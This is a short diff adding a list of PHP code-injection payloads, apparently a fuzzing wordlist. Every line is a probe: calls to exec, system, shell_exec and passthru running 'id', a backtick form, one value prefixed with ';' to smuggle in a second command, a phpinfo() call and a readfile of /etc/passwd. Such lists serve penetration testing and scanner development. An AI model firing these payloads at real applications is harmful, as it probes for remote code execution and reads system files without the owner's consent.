@@ -1,0 +1,8 @@
+exec("id")
+`id`
+passthru("id")
+phpinfo();
+readfile(/etc/passwd)
+shell_exec("id")
+;system("id")
+system("id")
